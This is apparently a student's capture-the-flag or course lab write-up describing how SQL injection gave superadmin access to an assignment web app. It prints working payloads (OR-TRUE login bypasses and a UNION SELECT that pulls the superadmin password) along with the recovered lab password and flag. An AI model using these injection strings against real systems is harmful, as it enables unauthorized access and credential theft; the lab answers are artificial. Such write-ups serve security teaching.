I'll try to walk you through my thought process for this assignment.

First and foremost, since I had access to the source code, as well as the schemas of the tables in the database, figuring out the SQL injections to gain access as superadmin was only a matter of time.

For the first SQLI, I had to use a method to bypass the user password validation. More specifically, I injected a random password followed by an OR operator followed by a TRUE statement.
For the second SQLI, I had to use a method to retrieve data from another database table. More specifically, injected an invalid item followed by the UNION operator followed by a malicious SQL query.

Here are my injections as well as proof of gaining superadmin access:
===============================================================================================================================
	1. Injection to bypass the password validation and login as user:
		Option 1: probably wrong password' OR TRUE--
		Option 2: probably wrong password' OR '1' = '1
		
	2. Injection to retrieve superadmin's password:
		invalid item' UNION SELECT username, password, password FROM users WHERE username = 'superadmin'--
		
	3. Turns out that the password is: "sup3r4dm1nP@5sw0rd"

	My trophy is: TUC{SQLi_1s_4w3s0m3_NGL_4nd_th3_sky_1s_blu3}
